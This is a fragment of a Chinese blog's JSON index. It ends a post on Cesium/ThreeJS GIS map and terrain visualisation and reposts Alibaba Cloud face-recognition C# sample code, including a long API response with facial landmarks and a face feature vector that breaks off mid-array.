OMS地图：https://c.tile.openstreetmap.org/{z}/{x}/{y}.png 大概试了一下谷歌地图不但没有被墙而且访问速度还非常的快，整体无论是精度还是数据量都远远超过国产地图，妈的，主场优势的BAT简直丢脸。 ※3.地形DEM数据可视化 这个效果无敌了 这个虽然看起来比较科幻，但是人家谷歌在多年前就已经有了，那就是将DEM数据在浏览器地图之中展示。不得不说这个还是效果还是NB的，但是人家谷歌使用的高度贴图，Cesium其实有点悲剧没有办法直接使用谷歌的高度贴图（至少我没有找到，谁知道可以给我说一下），所以就退而求其次使用第三方的DEM数据，比较痛苦的是Cesium官方其实是有一套全球14级的DEM数据的基本上开箱即用，但是国内访问速度太慢了，所以要不然就自己按照其规则去下载DEM数据然后自己搭建，我看了一下CSDN上有一个老哥搞了一个教程可以学习一波地址是：点击跳转，但是比较伤的是数据转换之后太大了服务器带宽不够所以我还是去找了一下国内速度比较快的最终还真就找到了一个全中国14级DEM，速度飞快： https://lab.earthsdk.com/terrain/577fd5b0ac1f11e99dbd8fd044883638 最终的效果就是上图的样子了 ※4、CZML数据文件封装 官网的卫星数据可视化Demo效果 这个东西我还没有完全搞懂，但是意思是非常清楚的，基本意味着GIS上能够用得上的所有数据呈现都有一个特定格式进行封装，包含了动画、路径、图标等等，我大概在官方Demo上看了一会，目前只能看看没有办法直接开始写但是东西就是这个东西，后续必须要学习一下，非常的震撼。 ※已知问题 1、目前的三维坐标转换函数只能在球面地图上良好的转换，平面上不行，主要是经纬度解析会GG。 不是二维，是平面！ 2、ThreeJS在0.87之后所有版本不知道为什么无法正常转换坐标，目前只能用0.87也将就一下了。 ※总结 以后任何可以使用GIS技术的项目应该都不会虚了，毕竟有了这些东西你告诉我什么效果实现不了？上文的内容基本上已经足够把基础的框架给搭建出来，我不会直接给你我搭建的源码毕竟不认真理解一波自己搭建起来是学不到任何东西的。","tags":"cesium threejs"},{"title":"阿里云人脸识别C#调用示例参考","url":"/20240807/a-li-yun-ren-lian-shi-bie-c-diao-yong-shi-li-can-kao/","text":"转载自 阿里云人脸识别C#调用示例参考 ※概述 前面介绍了关于阿里云人脸识别Java调用示例参考，本文主要介绍C#调用阿里云人脸识别服务，参数等的获取参考阿里云人脸识别使用流程简介。 ※Code Sample 1、使用网络图片 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465using System;using System.IO;using System.Net;using System.Reflection;using System.Text;namespace Demo&#123; class Program &#123; static void Main(string[] args) &#123; ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; //加上这一句 处理“请求被中止: 未能创建 SSL/TLS 安全通道”的问题 //ak,sk信息设置 string ak_id = &quot;********&quot;; string ak_secret = &quot;********&quot;; string method = &quot;POST&quot;; string accept = &quot;application/json&quot;; string contentType = accept; string body = &quot;&#123;\\&quot;type\\&quot;:0, \\&quot;image_url\\&quot;:\\&quot;https://ss0.bdstatic.com/94oJfD_bAAcT8t7mm9GUKT-xh_/timg?image&amp;quality=100&amp;size=b4000_4000&amp;sec=1553339483&amp;di=1929ba303e71874f634d7d1051a5e6fc&amp;src=http://b-ssl.duitang.com/uploads/item/201605/15/20160515065257_seVXJ.thumb.700_0.jpeg\\&quot;&#125;&quot;; byte[] data = Encoding.ASCII.GetBytes(body); string date = DateTime.UtcNow.GetDateTimeFormats(&#x27;r&#x27;)[0].ToString(); string urlpra = &quot;/face/attribute&quot;; string bodyMd5 = Convert.ToBase64String(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(body))); string result = &quot;&quot;; //待加密 string stringToSign = method + &quot;\\n&quot; + accept + &quot;\\n&quot; + bodyMd5 + &quot;\\n&quot; + contentType + &quot;\\n&quot; + date + &quot;\\n&quot; + urlpra; //stringToSign计算 HMAC-SHA1得到signature string signature = Convert.ToBase64String(new System.Security.Cryptography.HMACSHA1(Encoding.UTF8.GetBytes(ak_secret)).ComputeHash(Encoding.UTF8.GetBytes(stringToSign))); //得到 authorization header string authHeader = &quot;Dataplus &quot; + ak_id + &quot;:&quot; + signature; WebRequest req = WebRequest.Create(&quot;https://dtplus-cn-shanghai.data.aliyuncs.com/face/attribute&quot;); req.Method = method; req.ContentType = accept; req.GetRequestStream().Write(data, 0, data.Length); //利用反射机制 解决：&quot;此标头必须使用适当的属性进行修改&quot; 异常 MethodInfo priMethod = req.Headers.GetType().GetMethod(&quot;AddWithoutValidate&quot;, BindingFlags.Instance | BindingFlags.NonPublic); priMethod.Invoke(req.Headers, new[] &#123; &quot;Date&quot;, date &#125;); priMethod.Invoke(req.Headers, new[] &#123; &quot;Authorization&quot;, authHeader &#125;); priMethod.Invoke(req.Headers, new[] &#123; &quot;Accept&quot;, accept &#125;); string t = DateTime.UtcNow.GetDateTimeFormats(&#x27;r&#x27;)[0].ToString(); try &#123; result = new StreamReader(req.GetResponse().GetResponseStream()).ReadToEnd(); Console.WriteLine(&quot;result:&quot; + result); &#125; catch (WebException e) &#123; Console.WriteLine(e.GetBaseException()); Console.WriteLine(new StreamReader(e.Response.GetResponseStream()).ReadToEnd()); &#125; Console.WriteLine(result); Console.ReadKey(); &#125; &#125;&#125; 2、使用本地图片 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182using System;using System.IO;using System.Net;using System.Reflection;using System.Text;namespace Demo&#123; //使用本地图片 class Class1 &#123; static void Main(string[] args) &#123; ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; //加上这一句 处理“请求被中止: 未能创建 SSL/TLS 安全通道”的问题 //ak sk信息设置 string ak_id = &quot;********&quot;; string ak_secret = &quot;********&quot;; string method = &quot;POST&quot;; string accept = &quot;application/json&quot;; string contentType = accept; //图片的Base64编码 FileInfo file = new FileInfo(@&quot;D:\\picturetest\\timg.jpg&quot;); var stream = file.OpenRead(); byte[] buffer = new byte[file.Length]; //读取图片字节流 stream.Read(buffer, 0, Convert.ToInt32(file.Length)); //将base64字符串保存到base64.txt文件中 StreamWriter sw = new StreamWriter(&quot;base64.txt&quot;, false, Encoding.UTF8); //将字节流转化成base64字符串 sw.Write(Convert.ToBase64String(buffer)); string data1 = Convert.ToBase64String(buffer); sw.Close(); Console.WriteLine(&quot;Convert successful!&quot;); string body = &quot;&#123;\\&quot;type\\&quot;:1, \\&quot;content\\&quot;:\\&quot;&quot; + data1 + &quot;\\&quot; &#125;&quot;; byte[] data = Encoding.ASCII.GetBytes(body); string date = DateTime.UtcNow.GetDateTimeFormats(&#x27;r&#x27;)[0].ToString(); string urlpra = &quot;/face/attribute&quot;; string bodyMd5 = Convert.ToBase64String(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(body))); string result = &quot;&quot;; //待加密 string stringToSign = method + &quot;\\n&quot; + accept + &quot;\\n&quot; + bodyMd5 + &quot;\\n&quot; + contentType + &quot;\\n&quot; + date + &quot;\\n&quot; + urlpra; // stringToSign计算 HMAC-SHA1得到signature string signature = Convert.ToBase64String(new System.Security.Cryptography.HMACSHA1(Encoding.UTF8.GetBytes(ak_secret)).ComputeHash(Encoding.UTF8.GetBytes(stringToSign))); // 得到 authorization header string authHeader = &quot;Dataplus &quot; + ak_id + &quot;:&quot; + signature; WebRequest req = WebRequest.Create(&quot;https://dtplus-cn-shanghai.data.aliyuncs.com/face/attribute&quot;); req.Method = method; req.ContentType = accept; req.GetRequestStream().Write(data, 0, data.Length); //利用反射机制 解决：&quot;此标头必须使用适当的属性进行修改&quot; MethodInfo priMethod = req.Headers.GetType().GetMethod(&quot;AddWithoutValidate&quot;, BindingFlags.Instance | BindingFlags.NonPublic); priMethod.Invoke(req.Headers, new[] &#123; &quot;Date&quot;, date &#125;); priMethod.Invoke(req.Headers, new[] &#123; &quot;Authorization&quot;, authHeader &#125;); priMethod.Invoke(req.Headers, new[] &#123; &quot;Accept&quot;, accept &#125;); string t = DateTime.UtcNow.GetDateTimeFormats(&#x27;r&#x27;)[0].ToString(); try &#123; result = new StreamReader(req.GetResponse().GetResponseStream()).ReadToEnd(); Console.WriteLine(&quot;result:&quot; + result);//打印输出结果 &#125; catch (WebException e) &#123; Console.WriteLine(e.GetBaseException()); Console.WriteLine(new StreamReader(e.Response.GetResponseStream()).ReadToEnd()); &#125; //Console.WriteLine(result); Console.ReadKey(); &#125; &#125;&#125; 3、测试结果 12result:&#123;&quot;face_num&quot;:1,&quot;face_rect&quot;:[131,87,290,388],&quot;face_prob&quot;:[1.0],&quot;pose&quot;:[18.628498077392578,-8.546553611755371,6.121803283691406],&quot;landmark_num&quot;:105,&quot;landmark&quot;:[203.90921020507812,200.23001098632812,309.45062255859375,218.65631103515625,260.23175048828125,187.56857299804688,256.18084716796875,210.1221923828125,220.7862091064453,190.05401611328125,240.36923217773438,186.42405700683594,279.1256408691406,194.14773559570312,297.05645751953125,202.9366455078125,220.33831787109375,207.10421752929688,238.2987823486328,208.1050262451172,274.00946044921875,212.53118896484375,291.620849609375,216.21713256835938,360.25592041015625,223.7985076904297,421.49774169921875,213.7610321044922,391.5797119140625,204.12503051757812,391.2154235839844,221.29208374023438,369.4400634765625,215.39198303222656,380.16351318359375,209.08740234375,403.4003601074219,200.2273712158203,415.2815856933594,202.97317504882812,370.6798095703125,224.365478515625,381.1012268066406,223.80274963378906,401.0498046875,217.8040313720703,411.18768310546875,215.37713623046875,229.74484252929688,242.3505401611328,281.9598388671875,252.3939208984375,235.8517303466797,237.7692108154297,243.1636199951172,235.57656860351562,250.79469299316406,235.33493041992188,258.37054443359375,236.27748107910156,265.86907958984375,237.71218872070312,272.9955749511719,240.43788146972656,278.67138671875,245.51502990722656,234.4609375,247.66046142578125,240.4391632080078,251.49888610839844,247.0696563720703,254.06130981445312,253.96202087402344,255.785888671875,261.0655517578125,256.0698547363281,268.1637878417969,255.66668701171875,275.18548583984375,254.55349731445312,354.34912109375,258.4804382324219,394.4176025390625,248.78823852539062,356.7430419921875,252.51409912109375,360.75067138671875,247.50848388671875,365.6834716796875,243.4093475341797,371.655517578125,241.15150451660156,378.0198059082031,240.43600463867188,384.3763122558594,241.23443603515625,390.0915222167969,244.07086181640625,359.4935607910156,261.04217529296875,365.04833984375,262.5079650878906,370.7741394042969,262.9674987792969,376.4750671386719,262.41790771484375,381.8265380859375,260.39581298828125,386.527587890625,257.0871887207031,390.8385009765625,253.29058837890625,324.97564697265625,256.5946350097656,333.26715087890625,329.6019592285156,329.2874450683594,293.07568359375,322.9298095703125,344.294677734375,282.2880859375,336.0609436035156,354.2922668457031,337.4645080566406,239.21295166015625,370.7165222167969,327.9872131347656,379.0498352050781,247.05612182617188,372.2748107910156,322.6470947265625,380.3701171875,316.82196044921875,372.19573974609375,310.41607666015625,366.81512451171875,324.5108642578125,368.42181396484375,275.01959228515625,370.7666320800781,327.343505859375,373.64849853515625,257.11602783203125,370.507080078125,292.9189453125,370.6178894042969,326.2695617675781,370.87982177734375,326.8760986328125,376.5396728515625,304.1044921875,398.5556640625,268.6083068847656,391.4709777832031,318.451171875,391.78070068359375,252.39942932128906,383.1255798339844,285.8980407714844,397.2698669433594,311.641357421875,395.9100341796875,323.4048156738281,385.5922546386719,309.3697814941406,380.6801452636719,307.589111328125,378.0981140136719,277.8553466796875,378.915283203125,277.10003662109375,377.0374450683594,316.0401306152344,382.2570495605469,315.41925048828125,376.4609375,262.3118896484375,376.27154541015625,261.91851806640625,375.6103210449219,293.611572265625,379.8153076171875,292.3548278808594,377.26617431640625,312.68487548828125,381.60107421875,311.4006652832031,376.54986572265625,319.36029052734375,381.3873291015625,319.095458984375,378.2879638671875,125.97557067871094,212.2298583984375,412.7919616699219,240.69432067871094,294.56341552734375,471.08868408203125,150.15283203125,373.70672607421875,382.4216613769531,361.142333984375,129.2528839111328,293.0157470703125,405.01837158203125,301.0595703125,215.72640991210938,441.1959228515625,346.50909423828125,420.0110778808594],&quot;iris&quot;:[254.0318603515625,244.33462524414062,11.776544570922852,366.7712707519531,250.25103759765625,11.776544570922852],&quot;gender&quot;:[0],&quot;age&quot;:[25],&quot;expression&quot;:[0],&quot;glass&quot;:[0],&quot;dense_fea_len&quot;:1024,&quot;dense_fea&quot;:[-0.019565869122743607,0.02652040682733059,-0.025296641513705254,0.0013257524697110057,0.008678237907588482,0.0305195152759552,0.008465004153549671,-0.010204668156802654,-0.028829535469412804,0.04127579927444458,-0.03198869153857231,-0.05493219569325447,0.03645092993974686,9.515063720755279E-4,0.02821073867380619,0.03465251624584198,0.014170056208968163,0.018213540315628052,0.036748334765434265,-0.013548667542636395,-0.019267434254288673,0.01479480043053627,0.024582676589488983,-0.05292081832885742,0.02482527121901512,0.021547574549913406,-0.0022464583162218332,0.047043945640325546,0.01623036153614521,-0.004867010284215212,-3.7483361666090786E-4,0.008463726378977299,0.01411566324532032,-0.012659380212426186,-0.014888420701026917,1.9251948106102645E-4,-0.013585352338850498,-0.024148132652044296,0.028499891981482506,0.007853453047573566,-0.04516686126589775,0.026046570390462875,-0.013053921051323414,0.01066762674599886,-0.009034504182636738,0.0322597436606884,0.021841498091816902,-0.052442751824855804,0.04978729784488678,-0.021691270172595978,-0.008792974054813385,0.024738071486353874,-0.01489806268364191,-0.028748109936714172,-0.020100614055991173,0.029379351064562798,0.014156545512378216,0.031002260744571686,0.01518911961466074,0.007233195938169956,-0.03765062987804413,0.025897672399878502,-0.0651504173874855,-0.02410200424492359,0.03466656431555748,-0.029409699141979218,-0.03732691705226898,-0.01992214471101761,0.013510639779269695,-0.047079335898160934,0.025161176919937134,0.014117485843598843,0.02213362045586109,0.006637208163738251,0.017072606831789017,-0.03045104257762432,-0.005495634861290455,-3.929677404812537E-5,-0.036332666873931885,-0.01565079391002655,0.02436942607164383,-0.040990911424160004,-0.047258589416742325,-0.047424815595149994,-0.0334024541079998,0.007675712462514639,-0.016720000654459,-0.032920483499765396,-0.06034409999847412,0.01503259688615799,-0.02487960085272789,0.0077096931636333466,-0.03683016821742058,-0.022425202652812004,0.009493153542280197,-0.010177706368267536,-0.0635981634259224,0.02661089599132538,-0.0156524907797575,0.01956692710518837,0.014645323157310486,-0.010375571437180042,-0.019805679097771645,0.014683020301163197,0.013803336769342422,-0.03930310532450676,-0.0013638578820973635,-0.046861130744218826,-0.03787171468138695,-0.020587710663676262,-0.03255417197942734,0.078705795109272,-6.527972873300314E-4,-0.009917784482240677,-0.030237354338169098,-0.023531455546617508,0.016131145879626274,0.020083917304873466,-0.027687029913067818,-0.042260896414518356,0.06277380883693695,-0.02939515747129917,0.03830057382583618,-0.008601420558989048,-0.03364833816885948,-0.029685741290450096,-0.049161914736032486,-0.007496518548578024,-0.04712251201272011,-0.025192834436893463,0.026744462549686432,0.0553058497607708,-0.012511394917964935,0.03144007548689842,-0.006667234469205141,0.00834844820201397,-0.0059495349414646626,-0.016542736440896988,0.04807665944099426,0.026243198662996292,-0.04158074036240578,0.05009065195918083,0.01453778613358736,0.016685545444488525,0.035252489149570465,-0.017629582434892654,-0.030298609286546707,-0.07182624191045761,0.008106568828225136,-0.02584524266421795,-0.061746351420879364,-0.010592027567327023,0.003979993984103203,0.012710608541965485,0.0038761619944125414,0.012078766711056232,0.011401589028537273,-0.012593797408044338,-0.012608841061592102,-0.01323502603918314,0.009587514214217663,0.018524998798966408,0.007596731651574373,0.06681252270936966,-0.05013915151357651,0.07295693457126617,-0.03523214906454086,-0.035682737827301025,-0.018387148156762123,-0.0518253818154335,-0.021895956248044968,0.03330850601196289,0.05089137330651283,0.011064810678362846,0.03059087134897709,0.019475774839520454,-0.01622232422232628,-0.016904011368751526,0.03019464761018753,-0.039247531443834305,-0.004481450188905001,-0.04673612862825394,0.026468781754374504,-0.020347831770777702,-0.03681745007634163,0.00985900778323412,0.022565681487321854,0.013972022570669651,0.0054641240276396275,0.009626735933125019,-0.055112145841121674,-0.020836275070905685,-0.040630098432302475,0.003730934578925371,0.03793352469801903,0.07189374417066574,-0.005522116553038359,0.01430696900933981,0.05381489917635918,-0.03694852069020271,0.003008819418027997,0.01978391222655773,0.01712598092854023,0.006290169432759285,0.05086244270205498,0.0020777464378625154,-0.03905034437775612,0.01634850911796093,-0.017958298325538635,-0.05407799407839775,0.023605994880199432,0.0468127578496933,0.010871264152228832,0.005447959061712027,-0.02331494353711605,0.02528807707130909,0.028213798999786377,-0.022289060056209564,0.048880673944950104,-0.020433131605386734,-0.02176920510828495,-0.01317388005554676,0.029391195625066757,0.025683781132102013,-0.03681807592511177,0.04604785516858101,-0.02743005007505417,0.04135952517390251,0.029652152210474014,-0.038768526166677475,-0.05110153183341026,-0.04759001359343529,0.04036574810743332,0.03150022402405739,0.024236103519797325,-0.024325743317604065,0.036919642239809036,-0.05281908065080643,-0.018324755132198334,-0.027348224073648453,0.04459496587514877,-0.028998183086514473,-0.01329771801829338,0.030575864017009735,-0.020114978775382042,-0.02310255356132984,-0.06953969597816467,2.0780933846253902E-4,-0.03965244069695473,0.03746594488620758,-0.02527247741818428,2.6120757684111595E-4,-0.0018433531513437629,0.008129576221108437,0.05356234312057495,0.013009524904191494,-0.061822064220905304,0.02459772862493992,-0.04014294967055321,0.03285330906510353,0.009086492471396923,0.018615107983350754,0.00647433428093791,-0.009988122619688511,0.049740519374608994,0.003955503925681114,-0.03199645131826401,-0.012576830573379993,0.013144310563802719,-0.01228663232177496,-0.013566006906330585,-0.00828429963439703,0.004016808234155178,0.09092891961336136,-6.549324607476592E-4,-0.02558557689189911,-0.06884092837572098,-9.695181506685913E-4,-0.053455282002687454,-0.009376738220453262,-0.035260602831840515,-0.016300810500979424,-0.08021561056375504,0.009430884383618832,-0.04543987661600113,-0.0024705142714083195,-0.05730624496936798,-0.0196716096252203,-0.04764667525887489,-4.704423772636801E-4,-0.005540925078094006,-0.02839837782084942,-0.04563096538186073,-0.0254057589918375,-0.007531520910561085,0.055337127298116684,0.03921520337462425,0.03371762856841087,0.016526687890291214,0.025256965309381485,-0.028405819088220596,-0.07569451630115509,0.008604200556874275,-8.500913972966373E-4,-0.014106272719800472,-0.009853819385170937,0.01757221668958664,-0.025076311081647873,-0.014789684675633907,-0.031238095834851265,0.01278828363865614,0.005615269299596548,0.03826235234737396,0.04880881309509277,0.01955423504114151,-0.027956614270806313,-0.03885940462350845,-0.012534508481621742,0.04255145415663719,0.044804371893405914,-0.021619172766804695,-0.01421213336288929,-0.020056355744600296,-0.02708028070628643,0.02190909907221794,0.00688602589070797,-0.008955742232501507,-0.024975595995783806,0.04530319571495056,-0.005033159162849188,-0.03444739058613777,0.04793984815478325,0.004964737221598625,0.023403026163578033,0.007042721379548311,-0.040700480341911316,-0.06141165643930435,0.007979277521371841,-0.023922905325889587,-0.004918318707495928,0.01839129813015461,0.0389944426715374,0.013609785586595535,-0.007411249913275242,0.04396456107497215,-0.01943288929760456,-0.006824728101491928,0.05425979197025299,-0.005264225881546736,-0.014665547758340836,-0.004263053648173809,0.015169499441981316,-0.020430326461791992,-0.031193004921078682,0.025791890919208527,-0.03512677922844887,-0.012831372208893299,-0.04768975079059601,-0.02304854802787304,0.0024588583037257195,-0.03827845677733421,-0.06562338769435883,0.028942588716745377,-0.042514003813266754,-0.031193159520626068,-0.04255402833223343,0.05664687603712082,0.016119657084345818,-0.015722570940852165,-0.009873642586171627,-0.04536405950784683,0.05147889256477356,-0.003788416273891926,0.04480615258216858,-0.010936248116195202,0.003533179173246026,-0.012853305786848068,0.005227710120379925,0.025266198441386223,0.040439244359731674,-0.042127352207899094,-0.031913306564092636,0.022286705672740936,0.017463363707065582,0.0012414550874382257,-0.04225427284836769,0.02746277116239071,0.03229574114084244,-0.0030430611222982407,-0.007653215900063515,-0.02098017930984497,0.00670129619538784,-0.019720550626516342,0.0196071770042181,0.0028270611073821783,0.014768840745091438,-0.03796698525547981,0.016720235347747803,0.0017668295186012983,-0.012580408714711666,-0.014311019331216812,0.015156068839132786,0.07392140477895737,0.0018063491443172097,-0.013954157941043377,-0.009695334360003471,0.04940056800842285,0.03025032766163349,0.033327616751194,0.012690950185060501,-0.0538245365023613,0.012601231224834919,0.03988561034202576,0.020639341324567795,0.01051160879433155,-0.009630593471229076,-0.08055701106786728,-0.036430492997169495,-0.025659218430519104,0.019018078222870827,0.054914604872465134,-0.016415894031524658,0.04389834403991699,-0.035631634294986725,0.03789762407541275,0.0020610990468412638,0.020435960963368416,-0.006651830859482288,-0.014920215122401714,-0.027475396171212196,-0.026619376614689827,-0.07656590640544891,-0.0036131851375102997,-0.040190037339925766,-0.002752599772065878,-0.04798342287540436,0.01396635826677084,-0.022175056859850883,0.008131043054163456,-0.02489851787686348,-0.05697529762983322,0.015952082350850105,-0.010902098380029202,-0.026899080723524094,0.04347239062190056,-0.019214043393731117,-0.006123509723693132,-0.02543482556939125,0.06238100305199623,0.00577638391405344,-0.011739594861865044,-0.03684233874082565,0.010133092291653156,-0.009920259937644005,0.03769146278500557,0.0538882352411747,-0.0018801487749442458,-0.012788652442395687,0.016866814345121384,-0.04557843878865242,0.01492937933653593,-0.038526248186826706,0.03884685039520264,0.05304993316531181,-0.03635863587260246,-0.006040419917553663,0.016025332733988762,0.014858311973512173,0.006594682112336159,0.034767404198646545,-0.05745576322078705,6.801229901611805E-4,0.06594040244817734,0.02442966215312481,0.009246902540326118,-0.024938881397247314,-0.009100819937884808,-0.010550767183303833,-0.023051410913467407,-0.05348048359155655,0.03546988591551781,0.004852553829550743,0.0229302067309618,-0.017620377242565155,-0.01163723785430193,-0.036905333399772644,-0.017018750309944153,-0.004439314361661673,0.037742070853710175,0.05094502493739128,0.0022937851026654243,-0.07365942001342773,-0.014864935539662838,0.006508917082101107,-0.023067165166139603,-0.06367125362157822,-0.03891076520085335,-0.024187719449400902,-0.025690928101539612,-0.019099805504083633,0.011233361437916756,0.026437362655997276,-0.03816616162657738,-0.060305044054985046,-0.021739104762673378,0.014329582452774048,0.00745153846219182,0.01923714205622673,0.030139291658997536,-0.015107971616089344,0.02192893624305725,0.017867572605609894,-0.03345159813761711,0.048532698303461075,-0.04256083816289902,0.012320022098720074,0.003835898358374834,0.013754383660852909,0.011049808003008366,-0.00977579690515995,0.006327439099550247,0.09759684652090073,-0.009634733200073242,0.009735729545354843,0.03475852310657501,-0.017042584717273712,0.006444915197789669,0.029172133654356003,-0.04155300557613373,0.02839786186814308,-0.018251053988933563,-0.03314545005559921,-0.05458470433950424,0.03228972479701042,-0.002378081437200308,-0.003465689020231366,-0.03523945435881615,0.04235132038593292,-0.028863757848739624,0.014839496463537216,-0.012989182025194168,0.028868792578577995,0.03934892639517784,-0.02477121353149414,0.0324263870716095,-0.04058729484677315,-0.00877729244530201,-0.01724991574883461,0.018750056624412537,0.003230178263038397,0.03637741133570671,0.051315613090991974,-0.008803882636129856,0.02985924296081066,-0.01764664426445961,0.031984515488147736,0.006091058254241943,0.0057863579131662846,0.01143576018512249,-0.024009333923459053,0.007955512031912804,-0.05887165665626526,-0.0028545439708977938,-0.024048862978816032,0.009873149916529655,-0.015628501772880554,-0.07380187511444092,-0.019756309688091278,-0.005060930736362934,-0.01245366595685482,-0.008081095293164253,-0.0011957327369600534,0.0015826784074306488,0.010924356058239937,0.01966043934226036,-0.03886054456233978,0.017956318333745003,-0.01679409109055996,-0.01254162099212408,-0.023971958085894585,0.05574356019496918,0.017126288264989853,0.011216334067285061,0.042244698852300644,0.02005648799240589,0.040264733135700226,0.03272198513150215,0.008334454149007797,-0.014000206254422665,0.02621542662382126,-0.028785476461052895,-0.008298266679048538,0.035265009850263596,-0.06604240089654922,-0.054889459162950516,-0.02407420426607132,-0.018243174999952316,0.023327287286520004,0.013975678943097591,-0.020299384370446205,-0.07251012325286865,0.020858624950051308,-0.0062731909565627575,-0.025438303127884865,5.191202508285642E-4,0.0025054689031094313,0.017995381727814674,-0.006192240864038467,-0.011942937038838863,-0.010383151471614838,-0.035113945603370667,0.022518819198012352,-0.008996624499559402,0.02606983296573162,7.527820998802781E-4,0.024454964324831963,-0.0365334153175354,0.012231593951582909,0.034559957683086395,-0.017387328669428825,0.02069661393761635,0.005792704410851002,0.001858886331319809,0.03921511024236679,-0.006885612849146128,-0.01611446402966976,-0.021123502403497696,-0.009597811847925186,0.031175773590803146,-0.003349847160279751,0.01312889251857996,-0.04523979499936104,0.051702871918678284,-0.02848164737224579,0.015327978879213333,-0.052687544375658035,0.022266799584031105,-0.01678522489964962,-0.023664476349949837,0.009589951485395432,-0.011551662348210812,-0.02044581063091755,-0.03724430501461029,0.020525243133306503,0.01372605748474598,0.019521664828062057,-0.005096357315778732,-0.0035253367386758327,0.03726230561733246,0.023288631811738014,0.021730614826083183,0.04498527571558952,0.022119471803307533,0.04698268324136734,0.01580033078789711,0.019838206470012665,-0.044364772737026215,0.021730802953243256,-0.027049114927649498,-0.05865656957030296,0.006623429246246815,0.0021491742227226496,-0.05141407623887062,-0.04435764625668526,0.005598702002316713,0.0103635648265481,-0.03516082838177681,0.020858684554696083,-0.001553701120428741,-0.030875565484166145,-0.037201888859272,-0.0023125973530113697,-0.03282659500837326,-0.003910237457603216,-0.025248298421502113,-0.0021405848674476147,-0.037088025361299515,0.04309152439236641,-0.013890351168811321,-0.005736443214118481,-0.03885723650455475,-0.037063922733068466,-0.01979871094226837,0.03550277277827263,0.001134387799538672,0.029124608263373375,-0.017533814534544945,0.03406732529401779,-0.028683457523584366,0.008181183598935604,0.01801932603120804,-0.017518771812319756,0.008367341943085194,-0.04692481458187103,-0.009064574725925922,-0.015514141879975796,-0.08316738158464432,-0.024432986974716187,0.010592823848128319,-0.012309548445045948,0.041262198239564896,-0.014687208458781242,-0.024120831862092018,-0.033532772213220596,0.003668800927698612,0.025179848074913025,0.041504427790641785,0.019441641867160797,0.0209322739392519,-0.00781439058482647,0.05811570584774017,-0.05118130147457123,0.02608858421444893,0.03158450871706009,0.005990557372570038,0.018090685829520226,0.08083001524209976,0.03943118453025818,-0.03415079414844513,-0.05781104043126106,-0.00945993885397911,-0.02199721150100231,0.01133730448782444,-0.0024789657909423113,0.05951007455587387,0.005275815259665251,-0.028291353955864906,0.029365086928009987,0.03887820243835449,0.034725286066532135,0.014790983870625496,-0.012616056948900223,-1.8686247130972333E-5,-0.023896489292383194,-0.006331601180136204,-0.00435605039820075,-0.010190739296376705,0.003302903613075614,-0.07219726592302322,0.016480406746268272,0.03776325657963753,-0.013342609629034996,-0.039251238107681274,-0.03998871520161629,-0.0016504686791449785,0.029223769903182983,0.023125620558857918,0.0018889277707785368,-0.01572226732969284,-0.04796307161450386,0.016706466674804688,0.01000119000673294,0.0059198192320764065,0.008414414711296558,0.008980367332696915,0.03990929201245308,0.045949507504701614,-0.016356509178876877,-0.029623661190271378,-0.019295459613204002,-0.035757072269916534,0.03653063252568245,-0.009276709519326687,0.0028422679752111435,0.021541889756917953,0.0010574940824881196,0.07865062355995178,-0.005187304690480232,-0.02804129384458065,0.037446897476911545,-0.04298872873187065,0.04492132365703583,-0.00199534697458148,0.030226070433855057,0.06550963968038559,-0.010228810831904411,0.058698732405900955,0.02864663675427437,-0.025329696014523506,-0.04204826429486275,-0.02823682129383087,-0.04187684878706932,-0.033141862601041794,0.009752319194376469,0.030058933421969414,0.023311946541070938,0.008180173113942146,-0.09399928897619247,-0.045919064432382584,-0.04714840650558472,-0.04060627147555351,-9.753078338690102E-4,-0.0444047674536705,0.002999179298058152,-0.022458618506789207,-0.0021589715033769608,0.018953142687678337,-0.006542271003127098,0.04141530394554138,-0.0131559818983078,-0.07521522790193558,0.020049363374710083,-0.0034348685294389725,0.0036864259745925665,-0.021736059337854385,0.010572612285614014,0.00498866057023406,0.03551273047924042,-0.010736429132521152,0.02674330398440361,-0.006475439760833979,-0.004266663920134306,-0.031237484887242317,-0.009657835587859154,0.04948018863797188,0.021648909896612167,0.025878863409161568,-0.03518376126885414,-0.0010956601472571492,0.006011827848851681,0.011826086789369583,-1.3050096458755434E-4,0.03156076371669769,0.022082993760704994,0.08703446388244629,0.04179235175251961,0.06358940154314041,-0.02968417853116989,-0.003496970748528838,0.0316743366420269,0.002007226925343275,0.005037379451096058,-0.013503799214959145,-0.02276608720421791,0.0198051780462265,0.014105218462646008,0.02449001744389534,-0.013212719932198524,0.008877704851329327,-0.05457311496138573,-0.026899177581071854,0.02392779104411602,-0.01346517913043499,0.03503961116075516,-0.010939250700175762,-0.003654538420960307,6.11387484241277E-4,-0.019205285236239433,-0.04684864729642868,0.02592599391937256,-0.016297047957777977,-0.02201077528297901,0.027046557515859604,0.05528521165251732,0.022723594680428505,0.01798335090279579,-0.026575149968266487,-0.039279188960790634,0.07566069811582565,0.041370589286088943,0.039173685014247894,0.043904904276132584,-0.014897147193551064,-0.01122906245291233,-0.028850752860307693,-0.02650470659136772,0.030982157215476036,0.0023264053743332624,-0.03422655165195465,0.01944155804812908,-0.023388488218188286,0.002462210599333048,-1.3708540063817054E-4,-0.02976055070757866,0.03324774652719498,-0.03868003562092781,-0.06296172738075256,-0.03687579929828644,0.0706259161233902,0.020474016666412354,-0.025262758135795593,0.047264084219932556,-0.027542347088456154,0.03647620230913162,-0.010259519331157207,0.03222993388772011,-0.030983297154307365,0.018032576888799667,-0.020948486402630806,0.0033420310355722904,0.03480774909257889,0.040815792977809906,-0.03421010076999664,-0.008063972927629948,0.04071373492479324,-0.010648389346897602,-0.003924423363059759,-0.003111528931185603,0.00998598150908947,0.037015754729509354,-0.009199071675539017,0.027794595807790756,-0.007906417362391949,0.014943954534828663,-0.03177524358034134,0.025454819202423096,0.004652619827538729,0.02415081113576889,-0.03583135828375816,-0.0390060618519783,0.008770537562668324,-0.0037622114177793264,-0.009249706752598286,0.04077623784542084,0.047264255583286285,-0.019599707797169685,0.014159486629068851,0.04559126868844032,0.02749400958418846,-0.016096239909529686,0.06834854930639267,-0.005205987952649593,-0.027538590133190155,-0.006600099